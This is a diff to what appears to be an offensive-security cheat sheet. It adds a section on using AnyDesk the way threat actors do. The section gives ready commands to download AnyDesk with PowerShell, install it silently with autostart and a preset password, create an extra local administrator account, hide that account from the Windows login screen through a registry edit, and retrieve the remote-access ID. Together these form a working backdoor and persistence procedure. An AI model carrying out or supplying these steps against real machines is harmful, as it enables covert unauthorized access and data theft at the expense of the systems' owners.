@@ -108,6 +108,61 @@ Use idle hosts to mask scan origin.
 - `$ nmap --source-port 80 [target]`: Scan with a specified source port (80 in this case).
 
 
+**AnyDesk OPSEC Usage**
+
+*Introduction:*
+This outlines the usage of AnyDesk, a commercial remote access tool utilized by threat actors for browsing victim host file systems, deploying payloads, and data exfiltration.
+
+**Downloading and Installing AnyDesk:**
+
+1. **Download AnyDesk Executable:**
+   - Download the AnyDesk executable using PowerShell.
+   - Example PowerShell Script:
+     ```powershell
+     Invoke-WebRequest -Uri <AnyDesk_Download_URL> -OutFile 'C:\ProgramData\AnyDesk.exe'
+     ```
+
+2. **Silent Installation and Password Configuration:**
+   - Silently install AnyDesk and set an access password.
+   - Commands:
+     ```batch
+     cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
+     cmd.exe /c echo <Your_Password> | C:\ProgramData\AnyDesk.exe --set-password
+     ```
+
+**Configuring Additional Administrator Account:**
+
+3. **Create an Additional Administrator Account:**
+   - Add an administrator account with a password.
+   - Command:
+     ```batch
+     net user <Username> "<Password>" /add
+     ```
+
+4. **Add Account to Administrators Group:**
+   - Include the new administrator account in the Administrators group.
+   - Command:
+     ```batch
+     net localgroup Administrators <Username> /ADD
+     ```
+
+5. **Hide Account from Login Screen:**
+   - Prevent the account from appearing on the login screen.
+   - Command:
+     ```batch
+     reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v <Username> /t REG_DWORD /d 0 /f
+     ```
+
+**Gaining Remote Access with AnyDesk:**
+
+6. **Execute AnyDesk with Get-ID Parameter:**
+   - Launch AnyDesk with the `--get-id` parameter to enable remote access.
+   - Command:
+     ```batch
+     cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
+     ```
+
+#
 # Web path scanner
     dirsearch 
     DirBuster
